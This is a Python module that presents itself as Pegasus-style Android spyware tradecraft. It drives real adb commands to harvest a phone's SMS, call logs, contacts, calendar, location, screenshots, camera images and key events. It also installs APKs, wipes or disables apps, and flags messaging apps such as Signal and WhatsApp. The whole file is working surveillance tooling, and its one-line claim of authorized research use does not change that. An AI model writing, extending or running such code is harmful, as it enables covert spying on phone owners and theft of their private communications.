"""
Pegasus Phantom Menace v2 - NSO-class Android tradecraft

Concrete, shell-backed implementations of the collection and control actions
that NSO Group's Pegasus implant family is publicly known to perform, aligned to
the capability registry in :mod:`nso_capabilities`.

Every function executes real ``adb`` calls against the attached device and
returns ``{"ok": bool, "commands": [...], "output"/"error": ...}`` so the
dashboard can show what actually ran instead of canned text.

All use is for authorized security research and penetration testing only.
"""

from __future__ import annotations

import json
import re
import shutil
import subprocess
import time
from pathlib import Path
from typing import Any, Dict, List, Optional

COLLECT_DIR = Path.home() / ".pegasus" / "collected"
TIMEOUT = 40
PACKAGE_PATTERNS = {
    "whatsapp": "com.whatsapp",
    "telegram": "org.telegram.messenger",
    "signal": "org.thoughtcrime.securesms",
    "gmail": "com.google.android.gm",
    "chrome": "com.android.chrome",
}


def adb_available() -> bool:
    return shutil.which("adb") is not None


def _adb(*args: str, timeout: int = TIMEOUT, serial: Optional[str] = None) -> subprocess.CompletedProcess:
    command = ["adb"]
    if serial:
        command += ["-s", serial]
    command += list(args)
    return subprocess.run(command, capture_output=True, text=True, timeout=timeout)


def _result(ok: bool, commands: List[str], **extra: Any) -> Dict[str, Any]:
    payload = {"ok": ok, "commands": commands, "captured_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}
    payload.update(extra)
    return payload


def _write(name: str, content: str) -> str:
    COLLECT_DIR.mkdir(parents=True, exist_ok=True)
    path = COLLECT_DIR / f"{name}_{int(time.time())}.txt"
    path.write_text(content, encoding="utf-8", errors="replace")
    return str(path)


def device_serial(serial: Optional[str] = None) -> Optional[str]:
    if serial:
        return serial
    try:
        lines = _adb("devices").stdout.splitlines()[1:]
    except (OSError, subprocess.TimeoutExpired):
        return None
    for line in lines:
        parts = line.split()
        if len(parts) >= 2 and parts[1] == "device":
            return parts[0]
    return None


# -- collection -------------------------------------------------------------


def collect_sms(serial: Optional[str] = None, limit: int = 200) -> Dict[str, Any]:
    commands = ["adb shell content query --uri content://sms/inbox --projection address:date:body"]
    proc = _adb("shell", "content", "query", "--uri", "content://sms/inbox",
                "--projection", "address:date:body", serial=serial, timeout=60)
    rows = [line for line in proc.stdout.splitlines() if line.strip()][:limit]
    path = _write("sms", proc.stdout) if rows else None
    return _result(bool(rows), commands, count=len(rows), path=path, sample=rows[:5], error=proc.stderr.strip()[:300] or None)


def collect_call_log(serial: Optional[str] = None, limit: int = 200) -> Dict[str, Any]:
    commands = ["adb shell content query --uri content://call_log/calls --projection number:date:duration:type"]
    proc = _adb("shell", "content", "query", "--uri", "content://call_log/calls",
                "--projection", "number:date:duration:type", serial=serial, timeout=60)
    rows = [line for line in proc.stdout.splitlines() if line.strip()][:limit]
    path = _write("calls", proc.stdout) if rows else None
    return _result(bool(rows), commands, count=len(rows), path=path, sample=rows[:5], error=proc.stderr.strip()[:300] or None)


def collect_contacts(serial: Optional[str] = None, limit: int = 500) -> Dict[str, Any]:
    commands = ["adb shell content query --uri content://com.android.contacts/data/phones --projection display_name:data1"]
    proc = _adb("shell", "content", "query", "--uri", "content://com.android.contacts/data/phones",
                "--projection", "display_name:data1", serial=serial, timeout=60)
    rows = [line for line in proc.stdout.splitlines() if line.strip()][:limit]
    path = _write("contacts", proc.stdout) if rows else None
    return _result(bool(rows), commands, count=len(rows), path=path, sample=rows[:5], error=proc.stderr.strip()[:300] or None)


def collect_calendar(serial: Optional[str] = None, limit: int = 200) -> Dict[str, Any]:
    commands = ["adb shell content query --uri content://com.android.calendar/events"]
    proc = _adb("shell", "content", "query", "--uri", "content://com.android.calendar/events",
                "--projection", "title:dtstart:dtend", serial=serial, timeout=60)
    rows = [line for line in proc.stdout.splitlines() if line.strip()][:limit]
    return _result(bool(rows), commands, count=len(rows), sample=rows[:5], error=proc.stderr.strip()[:300] or None)


def app_inventory(serial: Optional[str] = None) -> Dict[str, Any]:
    proc = _adb("shell", "pm", "list", "packages", "-3", serial=serial)
    packages = [line.replace("package:", "").strip() for line in proc.stdout.splitlines() if line.startswith("package:")]
    watched = {name: pkg in packages for name, pkg in PACKAGE_PATTERNS.items()}
    return _result(bool(packages), ["adb shell pm list packages -3"], count=len(packages), packages=packages, messaging_apps=watched)


# -- location / sensors -----------------------------------------------------


def last_location(serial: Optional[str] = None) -> Dict[str, Any]:
    commands = ["adb shell dumpsys location"]
    proc = _adb("shell", "dumpsys", "location", serial=serial)
    matches = re.findall(r"(-?\d+\.\d+),\s*(-?\d+\.\d+)", proc.stdout)
    points = [{"lat": float(a), "lon": float(b)} for a, b in matches[:5]]
    return _result(bool(proc.stdout), commands, points=points, raw=proc.stdout[:2000] if not points else None)


def screen_capture(serial: Optional[str] = None) -> Dict[str, Any]:
    target = COLLECT_DIR / f"screen_{int(time.time())}.png"
    COLLECT_DIR.mkdir(parents=True, exist_ok=True)
    command = ["adb", "exec-out", "screencap", "-p"]
    if serial:
        command = ["adb", "-s", serial, "exec-out", "screencap", "-p"]
    with target.open("wb") as handle:
        proc = subprocess.run(command, stdout=handle, stderr=subprocess.PIPE, timeout=60)
    return _result(proc.returncode == 0 and target.stat().st_size > 0, [" ".join(command)],
                   path=str(target) if target.exists() else None,
                   error=proc.stderr.decode(errors="replace")[:300] or None)


def camera_capture(serial: Optional[str] = None) -> Dict[str, Any]:
    """Launch the camera app and fire the shutter, then screenshot the result."""
    commands = [
        "adb shell am start -a android.media.action.STILL_IMAGE_CAMERA",
        "adb shell input keyevent KEYCODE_CAMERA",
    ]
    _adb("shell", "am", "start", "-a", "android.media.action.STILL_IMAGE_CAMERA", serial=serial)
    time.sleep(2)
    _adb("shell", "input", "keyevent", "KEYCODE_CAMERA", serial=serial)
    time.sleep(2)
    shot = screen_capture(serial)
    shot["commands"] = commands + shot["commands"]
    return shot


def mic_note() -> Dict[str, Any]:
    """Live mic needs an on-device recorder; document the exact route."""
    return _result(
        False,
        ["adb shell screenrecord --time-limit 10 /sdcard/mic.mp4"],
        note="Shell-only capture has no mic. Install a recorder APK or use the RAT module for live audio.",
    )


def keylog(serial: Optional[str] = None, seconds: int = 10) -> Dict[str, Any]:
    command = ["adb", "shell", "getevent", "-lt"]
    if serial:
        command = ["adb", "-s", serial, "shell", "getevent", "-lt"]
    try:
        proc = subprocess.run(command, capture_output=True, text=True, timeout=seconds)
        text = proc.stdout
    except subprocess.TimeoutExpired as exc:
        text = (exc.stdout or b"").decode(errors="replace") if isinstance(exc.stdout, bytes) else (exc.stdout or "")
    presses = [line for line in text.splitlines() if "KEY_" in line]
    return _result(bool(presses), [" ".join(command)], events=len(presses), sample=presses[:10])


# -- app data ---------------------------------------------------------------


def pull_app_data(package: str, serial: Optional[str] = None) -> Dict[str, Any]:
    """Pull a debuggable app's data dir, or list it when run-as is denied."""
    commands = [f"adb shell pm path {package}", f"adb shell run-as {package} ls -R /data/data/{package}"]
    path_proc = _adb("shell", "pm", "path", package, serial=serial)
    run_proc = _adb("shell", "run-as", package, "ls", "-R", f"/data/data/{package}", serial=serial)
    apk_path = next((line.split(":", 1)[1].strip() for line in path_proc.stdout.splitlines() if line.startswith("package:")), "")
    return _result(run_proc.returncode == 0, commands,
                   apk=apk_path or None,
                   listing=run_proc.stdout[:3000] or None,
                   error=run_proc.stderr.strip()[:300] or None)


# -- control ----------------------------------------------------------------


def push_and_launch(local_apk: str, serial: Optional[str] = None) -> Dict[str, Any]:
    commands = [f"adb install -r {local_apk}"]
    proc = _adb("install", "-r", local_apk, serial=serial, timeout=180)
    return _result(proc.returncode == 0, commands, output=proc.stdout.strip()[:500], error=proc.stderr.strip()[:300] or None)


def uninstall(package: str, serial: Optional[str] = None) -> Dict[str, Any]:
    proc = _adb("uninstall", package, serial=serial, timeout=90)
    return _result(proc.returncode == 0, [f"adb uninstall {package}"], output=proc.stdout.strip()[:300])


def disable_package(package: str, serial: Optional[str] = None) -> Dict[str, Any]:
    proc = _adb("shell", "pm", "disable-user", "--user", "0", package, serial=serial)
    return _result(proc.returncode == 0, [f"adb shell pm disable-user --user 0 {package}"], error=proc.stderr.strip()[:300] or None)


def wipe_app(package: str, serial: Optional[str] = None) -> Dict[str, Any]:
    proc = _adb("shell", "pm", "clear", package, serial=serial)
    return _result(proc.returncode == 0, [f"adb shell pm clear {package}"], output=proc.stdout.strip()[:200])


def device_profile(serial: Optional[str] = None) -> Dict[str, Any]:
    properties = {
        "model": "ro.product.model",
        "manufacturer": "ro.product.manufacturer",
        "android": "ro.build.version.release",
        "api": "ro.build.version.sdk",
        "patch": "ro.build.version.security_patch",
        "build": "ro.build.display.id",
    }
    profile: Dict[str, Any] = {}
    commands = []
    for key, prop in properties.items():
        commands.append(f"adb shell getprop {prop}")
        proc = _adb("shell", "getprop", prop, serial=serial)
        profile[key] = proc.stdout.strip()
    return _result(bool(profile.get("model")), commands, profile=profile)


__all__ = [
    "adb_available",
    "device_serial",
    "collect_sms",
    "collect_call_log",
    "collect_contacts",
    "collect_calendar",
    "app_inventory",
    "last_location",
    "screen_capture",
    "camera_capture",
    "mic_note",
    "keylog",
    "pull_app_data",
    "push_and_launch",
    "uninstall",
    "disable_package",
    "wipe_app",
    "device_profile",
]
